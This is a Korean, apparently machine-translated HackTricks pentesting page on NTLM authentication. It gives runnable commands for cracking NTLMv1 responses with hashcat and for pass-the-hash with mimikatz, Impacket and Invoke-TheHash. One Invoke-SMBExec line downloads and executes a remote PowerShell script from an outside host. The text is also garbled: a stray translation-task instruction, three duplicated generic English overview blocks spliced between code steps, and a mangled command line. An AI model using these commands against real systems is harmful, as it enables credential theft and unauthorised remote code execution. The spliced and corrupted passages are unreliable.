# NTLM

## NTLM

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **해킹 트릭을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요.**

</details>

### 기본 정보

**Windows XP 및 Server 2003**이 작동하는 환경에서는 LM (Lan Manager) 해시가 사용되지만, 이는 쉽게 침해될 수 있다는 것이 널리 알려져 있습니다. 특정 LM 해시인 `AAD3B435B51404EEAAD3B435B51404EE`는 LM이 사용되지 않는 경우를 나타내며, 빈 문자열의 해시를 나타냅니다.

기본적으로 **Kerberos** 인증 프로토콜이 주로 사용됩니다. NTLM (NT LAN Manager)은 특정 상황에서 사용됩니다: Active Directory가 없는 경우, 도메인이 존재하지 않는 경우, Kerberos가 잘못된 구성으로 인해 제대로 작동하지 않는 경우 또는 유효한 호스트 이름 대신 IP 주소를 사용하여 연결을 시도하는 경우입니다.

네트워크 패킷에서 **"NTLMSSP"** 헤더의 존재는 NTLM 인증 프로세스를 나타냅니다.

인증 프로토콜인 LM, NTLMv1 및 NTLMv2의 지원은 `%windir%\Windows\System32\msv1\_0.dll`에 위치한 특정 DLL을 통해 가능합니다.

**주요 포인트**:

* LM 해시는 취약하며 빈 LM 해시 (`AAD3B435B51404EEAAD3B435B51404EE`)는 사용되지 않음을 나타냅니다.
* 기본 인증 방법은 Kerberos이며, NTLM은 특정 조건에서만 사용됩니다.
* NTLM 인증 패킷은 "NTLMSSP" 헤더로 식별할 수 있습니다.
* 시스템 파일 `msv1\_0.dll`을 통해 LM, NTLMv1 및 NTLMv2 프로토콜이 지원됩니다.

### LM, NTLMv1 및 NTLMv2

사용할 프로토콜을 확인하고 구성할 수 있습니다:

#### GUI

\_secpol.msc\_를 실행 -> 로컬 정책 -> 보안 옵션 -> 네트워크 보안: LAN Manager 인증 수준. 6개의 수준(0부터 5까지)이 있습니다.

![](<../../.gitbook/assets/image (92).png>)

#### 레지스트리

다음은 레벨 5로 설정합니다:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

가능한 값:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

### 기본 NTLM 도메인 인증 체계

1. **사용자**가 **자격 증명**을 입력합니다.
2. 클라이언트 기기는 **도메인 이름**과 **사용자 이름**을 포함한 **인증 요청을 전송**합니다.
3. **서버**는 \*\*도전(challenge)\*\*을 전송합니다.
4. 클라이언트는 **비밀번호의 해시를 키로 사용하여 도전을 암호화**하고 응답으로 전송합니다.
5. **서버는 도메인 컨트롤러**에게 **도메인 이름, 사용자 이름, 도전 및 응답**을 전송합니다. Active Directory가 구성되어 있지 않거나 도메인 이름이 서버 이름인 경우 자격 증명은 **로컬로 확인**됩니다.
6. **도메인 컨트롤러는 모든 것이 올바른지 확인**하고 정보를 서버로 전송합니다.

**서버**와 **도메인 컨트롤러**는 **Netlogon** 서버를 통해 **안전한 채널**을 생성할 수 있습니다. 도메인 컨트롤러는 서버의 비밀번호를 알고 있기 때문입니다(이는 **NTDS.DIT** 데이터베이스에 저장되어 있음).

#### 로컬 NTLM 인증 체계

인증은 **이전과 동일하지만** **서버**는 **SAM** 파일 내에서 인증을 시도하는 사용자의 해시를 알고 있습니다. 따라서 도메인 컨트롤러에 요청하는 대신 **서버 자체에서 사용자 인증을 확인**합니다.

#### NTLMv1 도전

**도전의 길이는 8바이트**이며 **응답은 24바이트**입니다.

\*\*해시 NT(16바이트)\*\*는 **각각 7바이트로 구성된 3개의 부분**(7B + 7B + (2B+0x00\*5))으로 나누어집니다. **마지막 부분은 0으로 채워집니다**. 그런 다음 **도전**은 각 부분별로 **별도로 암호화**되고 결과로 나온 암호화된 바이트가 **결합**됩니다. 총: 8B + 8B + 8B = 24바이트.

**문제점**:

* **무작위성 부족**
* 3개의 부분은 NT 해시를 찾기 위해 **별도로 공격**받을 수 있습니다.
* **DES는 깰 수 있습니다**
* 3번째 키는 항상 **5개의 0으로 구성**됩니다.
* **같은 도전**이 주어지면 **응답**은 **동일**합니다. 따라서 피해자에게 문자열 "**1122334455667788**"을 **도전**으로 제공하고 **미리 계산된 무지개 테이블**을 사용하여 응답을 공격할 수 있습니다.

#### NTLMv1 공격

현재는 Unconstrained Delegation이 구성된 환경을 찾기 어려워지고 있지만, 이는 구성된 **Print Spooler 서비스를 악용**할 수 없음을 의미하지는 않습니다.

AD에서 이미 가지고 있는 일부 자격 증명/세션을 사용하여 **프린터가 제어하려는 호스트에 대해 인증을 요청**할 수 있습니다. 그런 다음 `metasploit auxiliary/server/capture/smb` 또는 `responder`를 사용하여 **인증 도전을 1122334455667788로 설정**하고 인증 시도를 캡처하면, **NTLMv1**을 사용하여 수행된 경우 **해독**할 수 있습니다.\
`responder`를 사용하는 경우 **인증을 다운그레이드**하기 위해 `--lm` 플래그를 사용해 볼 수 있습니다.\
_이 기술을 위해 인증은 NTLMv1을 사용하여 수행되어야 합니다(NTLMv2는 유효하지 않음)._

프린터는 인증 중에 컴퓨터 계정을 사용하며, 컴퓨터 계정은 **긴 무작위 암호**를 사용하므로 일반적인 **사전**을 사용하여 해독할 수 없을 것입니다. 그러나 **NTLMv1** 인증은 **DES를 사용**합니다([더 많은 정보는 여기에서 확인](./#ntlmv1-challenge)), 따라서 DES를 크랙하기 위해 특별히 제작된 일부 서비스를 사용하여 해독할 수 있습니다(예: [https://crack.sh/](https://crack.sh)).

#### hashcat을 사용한 NTLMv1 공격

NTLMv1은 hashcat으로 크랙할 수 있는 NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)을 사용하여 깰 수도 있습니다.

명령어

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

다음은 /hive/hacktricks/windows-hardening/ntlm/README.md 파일에서 가져온 내용입니다. 관련된 영어 텍스트를 한국어로 번역하고, 동일한 마크다운 및 HTML 구문을 유지한 채 번역한 내용을 반환하세요. 코드, 해킹 기법 이름, 해킹 용어, 클라우드/SaaS 플랫폼 이름(예: Workspace, aws, gcp...), 'leak'이라는 단어, 펜테스팅 및 마크다운 태그와 같은 요소는 번역하지 마십시오. 또한 번역 및 마크다운 구문 이외의 추가 내용은 추가하지 마십시오.

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

## NTLM

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for user authentication.

### NTLM Authentication Process

1. The client sends a request to the server.
2. The server responds with a challenge.
3. The client encrypts the challenge using the user's password hash and sends it back to the server.
4. The server verifies the response by decrypting it using the user's password hash.
5. If the response is valid, the server grants access to the client.

### NTLM Vulnerabilities

NTLM has several vulnerabilities that can be exploited by attackers:

1. **Pass-the-Hash (PtH) Attack**: An attacker captures the NTLM hash of a user and uses it to authenticate as that user without knowing the actual password.
2. **Pass-the-Ticket (PtT) Attack**: An attacker captures the Kerberos ticket of a user and uses it to authenticate as that user without knowing the actual password.
3. **NTLM Relay Attack**: An attacker intercepts the NTLM authentication request and relays it to another server, gaining unauthorized access.
4. **NTLM Downgrade Attack**: An attacker forces the use of weaker NTLM protocols, making it easier to crack the password hash.

### Mitigating NTLM Vulnerabilities

To mitigate NTLM vulnerabilities, consider the following measures:

1. **Disable NTLM**: Disable NTLM authentication if not required.
2. **Enable SMB Signing**: Enable SMB signing to prevent NTLM relay attacks.
3. **Use Strong Passwords**: Enforce the use of strong passwords to make it harder to crack the password hash.
4. **Implement Multi-Factor Authentication (MFA)**: Implement MFA to add an extra layer of security to the authentication process.
5. **Monitor NTLM Traffic**: Monitor and analyze NTLM traffic for any suspicious activity.

By understanding the NTLM authentication process and its vulnerabilities, you can take appropriate steps to secure your Windows environment.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

hashcat를 실행하세요 (hashtopolis와 같은 도구를 통해 분산 실행이 가장 좋습니다). 그렇지 않으면 이 작업은 몇 일이 걸릴 수 있습니다.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

이 경우에는 비밀번호가 "password"라는 것을 알고 있으므로 데모 목적으로 속임수를 사용할 것입니다:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

이제 해시캣 유틸리티를 사용하여 깨진 DES 키를 NTLM 해시의 일부로 변환해야합니다:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

### NTLM

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for user authentication.

#### NTLM Authentication Process

1. The client sends a request to the server.
2. The server responds with a challenge.
3. The client encrypts the challenge using the user's password hash and sends it back to the server.
4. The server verifies the response by decrypting it using the user's password hash.
5. If the response is valid, the server grants access to the client.

#### NTLM Vulnerabilities

1. **Pass-the-Hash (PtH) Attack**: An attacker captures the NTLM hash of a user and uses it to authenticate as that user without knowing the actual password.
2. **Pass-the-Ticket (PtT) Attack**: An attacker captures the Kerberos ticket of a user and uses it to authenticate as that user without knowing the actual password.
3. **NTLM Relay Attack**: An attacker intercepts the NTLM authentication request and relays it to another server, gaining unauthorized access to the target system.
4. **NTLM Downgrade Attack**: An attacker forces the use of NTLM authentication instead of more secure protocols like Kerberos, making it easier to exploit NTLM vulnerabilities.

#### Mitigations

1. **Disable NTLM**: Disable NTLM authentication and use more secure protocols like Kerberos.
2. **Enable Extended Protection for Authentication**: Enable Extended Protection for Authentication to prevent NTLM relay attacks.
3. **Enable SMB Signing**: Enable SMB signing to protect against NTLM relay attacks.
4. **Use Strong Passwords**: Encourage users to use strong, complex passwords to make it harder for attackers to crack the password hash.
5. **Implement Multi-Factor Authentication (MFA)**: Implement MFA to add an extra layer of security to the authentication process.

For more information and detailed mitigations, refer to the official Microsoft documentation.

#### References

* [Microsoft NTLM Overview](https://docs.microsoft.com/en-us/windows-server/security/ntlm/ntlm-overview)
* [Microsoft NTLM Security Guide](https://docs.microsoft.com/en-us/windows-server/security/ntlm/ntlm-security-guide)

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

## NTLM

### Introduction

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for user authentication.

### NTLM Authentication Process

1. The client sends a request to the server.
2. The server responds with a challenge.
3. The client encrypts the challenge using the user's password hash and sends it back to the server.
4. The server verifies the response by decrypting it using the user's password hash.
5. If the response is valid, the server grants access to the client.

### NTLM Vulnerabilities

1. **Pass-the-Hash (PtH) Attack**: An attacker captures the NTLM hash of a user and uses it to authenticate as that user without knowing the actual password.
2. **Pass-the-Ticket (PtT) Attack**: An attacker captures a Kerberos ticket and uses it to authenticate as a user without knowing the user's password.
3. **NTLM Relay Attack**: An attacker intercepts an NTLM authentication request and relays it to another server, gaining unauthorized access.
4. **NTLM Downgrade Attack**: An attacker forces a client and server to use a weaker version of NTLM, making it easier to crack the password hash.

### Mitigation Techniques

1. **Disable NTLM**: Disable NTLM authentication and use more secure protocols like Kerberos.
2. **Enforce Strong Password Policies**: Implement strong password policies to prevent easy cracking of password hashes.
3. **Enable Extended Protection for Authentication**: Enable Extended Protection for Authentication to protect against NTLM relay attacks.
4. **Enable SMB Signing**: Enable SMB signing to prevent NTLM downgrade attacks.
5. **Monitor Event Logs**: Regularly monitor event logs for suspicious NTLM-related activities.

### Conclusion

Understanding the vulnerabilities associated with NTLM authentication is crucial for securing Windows environments. By implementing the recommended mitigation techniques, organizations can significantly reduce the risk of NTLM-related attacks.

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

#### NTLMv2 도전

**도전 길이는 8바이트**이며 **2개의 응답이 전송**됩니다: 하나는 **24바이트**이고 **다른 하나**의 길이는 **가변**입니다.

**첫 번째 응답**은 **클라이언트와 도메인**으로 구성된 **문자열**을 사용하여 **NT 해시**의 **해시 MD4**를 **키**로 사용하여 **HMAC\_MD5**를 사용하여 암호화하는 것으로 생성됩니다. 그런 다음, **결과**는 **도전**을 암호화하는 데 사용될 **키**로 사용됩니다. 여기에는 **8바이트의 클라이언트 도전**이 추가됩니다. 총: 24 B.

**두 번째 응답**은 **여러 값**을 사용하여 생성됩니다 (새로운 클라이언트 도전, **재생 공격**을 피하기 위한 **타임스탬프**...).

**성공적인 인증 프로세스를 캡처한 pcap**이 있다면, 도메인, 사용자 이름, 도전 및 응답을 얻기 위해이 가이드를 따라 해시를 크랙해 볼 수 있습니다: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

### 해시 전달

**피해자의 해시를 얻은 후**, 해당 해시를 사용하여 **피해자를 가장하는** 것이 가능합니다.\
해당 **해시를 사용하여 NTLM 인증을 수행하는 도구**를 사용해야 합니다. **또는** 새로운 **세션 로그온**을 만들고 **LSASS**에 해당 **해시를 삽입**하여 **NTLM 인증이 수행될 때 해당 해시가 사용**될 수 있습니다. 마지막 옵션은 mimikatz가 수행하는 작업입니다.

**참고로 컴퓨터 계정을 사용하여 해시 전달 공격을 수행할 수도 있습니다.**

#### **Mimikatz**

**관리자 권한으로 실행해야 합니다.**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

이렇게 하면 mimikatz를 실행한 사용자에게 속하는 프로세스가 시작되지만, 내부적으로 LSASS에 저장된 자격 증명은 mimikatz 매개 변수 내에 있습니다. 그런 다음 해당 사용자처럼 네트워크 리소스에 액세스할 수 있습니다 (`runas /netonly` 트릭과 유사하지만 평문 암호를 알 필요가 없습니다).

#### 리눅스에서의 Pass-the-Hash

리눅스에서 Pass-the-Hash를 사용하여 Windows 기기에서 코드 실행을 얻을 수 있습니다.\
[**여기에서 어떻게 하는지 알아보세요.**](https://github.com/carlospolop/hacktricks/blob/kr/windows/ntlm/broken-reference/README.md)

#### Impacket Windows 컴파일된 도구

Windows용 [impacket 이진 파일은 여기에서 다운로드할 수 있습니다](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (이 경우 명령을 지정해야 합니다. cmd.exe와 powershell.exe는 대화형 셸을 얻기 위해 유효하지 않습니다)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Impacket 이진 파일은 여러 개 더 있습니다...

#### Invoke-TheHash

여기에서 powershell 스크립트를 얻을 수 있습니다: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

**Invoke-SMBExec**

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Invoke-WMIExec**

`Invoke-WMIExec`은 원격 시스템에서 WMI를 사용하여 명령을 실행하는 도구입니다. 이 도구는 NTLM 해시를 사용하여 인증을 우회하고 명령을 실행할 수 있습니다.

**사용법**

```
Invoke-WMIExec -Target <Target> -Username <Username> -Password <Password> -Command <Command>
```

* `Target`: 명령을 실행할 대상 시스템의 IP 주소 또는 호스트 이름입니다.
* `Username`: 인증에 사용할 사용자 이름입니다.
* `Password`: 인증에 사용할 비밀번호입니다.
* `Command`: 실행할 명령입니다.

**예제**

```
Invoke-WMIExec -Target 192.168.1.10 -Username Administrator -Password P@ssw0rd -Command "net user"
```

이 예제에서는 `192.168.1.10`에 있는 시스템에서 `Administrator` 계정으로 인증하고 `net user` 명령을 실행합니다.

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Invoke-SMBClient**

Invoke-SMBClient는 Windows 시스템에서 SMB 클라이언트를 호출하는 PowerShell 스크립트입니다. 이 스크립트를 사용하면 SMB 프로토콜을 통해 원격 시스템에 액세스하고 파일 및 디렉토리를 조작할 수 있습니다.

**사용법**

```powershell
Invoke-SMBClient -Target <TargetIP> -Username <Username> -Password <Password> -Command <Command>
```

* `TargetIP`: 액세스하려는 원격 시스템의 IP 주소입니다.
* `Username`: 원격 시스템에 사용할 사용자 이름입니다.
* `Password`: 사용자의 암호입니다.
* `Command`: 실행할 명령어입니다. 이 명령어는 원격 시스템에서 실행됩니다.

**예제**

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "dir C:\"
```

이 예제에서는 192.168.1.100 IP 주소를 가진 원격 시스템에 Administrator 사용자로 로그인하고, C:\ 디렉토리의 내용을 나열하는 명령어를 실행합니다.

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

**Invoke-SMBEnum**

Invoke-SMBEnum은 SMB 프로토콜을 사용하여 Windows 시스템에서 정보를 수집하는 도구입니다. 이 도구는 SMB 공유, 사용자 계정, 그룹, 로컬 관리자, 로컬 그룹, 로컬 사용자, 로컬 그룹 정책 등 다양한 정보를 검색할 수 있습니다.

사용법:

```powershell
Invoke-SMBEnum -Target <TargetIP> -Username <Username> -Password <Password>
```

* `TargetIP`: 대상 시스템의 IP 주소입니다.
* `Username`: 인증에 사용할 사용자 이름입니다.
* `Password`: 인증에 사용할 비밀번호입니다.

이 도구는 SMB 프로토콜을 통해 대상 시스템에 연결하고, 해당 시스템에서 정보를 수집합니다. 이를 통해 시스템의 취약점을 식별하고, 보안 강화를 위한 조치를 취할 수 있습니다.

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

**Invoke-TheHash**

이 함수는 **다른 함수들을 혼합**한 것입니다. 여러 **호스트**를 전달하고, 어떤 사람들을 **제외**하고, 사용하고자 하는 **옵션**을 **선택**할 수 있습니다 (_SMBExec, WMIExec, SMBClient, SMBEnum_). **SMBExec**와 **WMIExec** 중 **어떤 것**을 선택하더라도 _**Command**_ 매개변수를 제공하지 않으면 **권한이 충분한지**만 확인합니다.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

#### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

#### Windows Credentials Editor (WCE)

**관리자 권한으로 실행해야 함**

이 도구는 mimikatz와 동일한 작업을 수행합니다 (LSASS 메모리 수정).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

#### 사용자 이름과 비밀번호로 수동 Windows 원격 실행

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

### Windows 호스트에서 자격 증명 추출

**Windows 호스트에서 자격 증명을 얻는 방법에 대한 자세한 정보는** [**이 페이지를 읽어보세요**](https://github.com/carlospolop/hacktricks/blob/kr/windows-hardening/ntlm/broken-reference/README.md)**.**

### NTLM Relay 및 Responder

**이러한 공격을 수행하는 방법에 대한 자세한 가이드는 다음을 참조하세요:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### 네트워크 캡처에서 NTLM 도전을 파싱

[**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)**를 사용할 수 있습니다.**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 홍보**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **저를 팔로우**하세요. 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **자신의 해킹 기법을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요.**

</details>
